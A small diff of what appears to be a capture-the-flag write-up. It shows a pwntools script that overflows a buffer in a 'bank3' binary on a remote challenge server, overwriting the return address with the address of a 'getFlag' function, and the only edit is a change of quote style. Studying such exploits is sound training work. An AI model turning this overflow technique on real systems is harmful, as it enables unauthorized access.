@@ -29,7 +29,7 @@ We exploit buffer overflow to overwrite the return address with the address of `
 from pwn import *
 elf = ELF('./bank3')
 conn = remote('61.28.237.24', 30204)
-conn.sendlineafter("name:", b'a' * 80 + p32(elf.symbols['getFlag']))
+conn.sendlineafter('name:', b'a' * 80 + p32(elf.symbols['getFlag']))
 conn.interactive()
 ```
 
